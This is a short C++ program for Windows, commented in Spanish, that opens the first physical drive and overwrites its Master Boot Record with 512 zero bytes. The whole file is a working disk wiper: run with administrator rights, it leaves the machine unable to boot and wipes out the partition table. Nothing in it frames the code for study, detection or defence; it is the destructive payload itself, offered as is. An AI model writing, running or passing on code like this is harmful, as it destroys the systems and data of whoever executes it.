#include <Windows.h>
#include <iostream>

//Definir el tamaño por defecto que tiene Master Boot Record
#define MBR_SIZE 512

int main() 
{
	DWORD buffer;
	char mbrContent[MBR_SIZE];

	//Vaciar contenido de MBR
	ZeroMemory(&mbrContent, sizeof(mbrContent));

	//Acceso al MBR
	HANDLE MasterBootRecord = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ |
		FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);

	//Vaciar por completo el MBR
	WriteFile(MasterBootRecord, mbrContent, 512, &buffer, NULL);

	CloseHandle(MasterBootRecord);
	return EXIT_SUCCESS;
}